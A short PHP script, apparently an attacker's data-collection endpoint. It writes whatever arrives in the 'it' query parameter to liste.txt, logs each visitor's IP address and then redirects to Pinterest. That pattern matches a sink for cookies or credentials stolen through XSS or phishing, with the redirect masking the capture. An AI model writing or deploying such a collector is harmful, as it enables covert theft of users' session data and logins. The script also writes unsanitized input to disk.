
<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function Yonlendir($url,$zaman = 0){
	if($zaman != 0){
		header("Refresh: $zaman; url=$url");
	}
	else header("Location: $url");
}


try{
	if(isset($_GET['it'])) {
		$content = $_GET['it'];
		$dosya = fopen('liste.txt', 'a');
		fwrite($dosya, "$content\n");
		fclose($dosya);
	}
} catch(Exception $e)
{
	die($e->getMessage());
}


$ip=$_SERVER['REMOTE_ADDR'];
$dosya = fopen('ban.txt', 'a');
fwrite($dosya, "$ip");
fclose($dosya);
Yonlendir("https://www.pinterest.com");
?>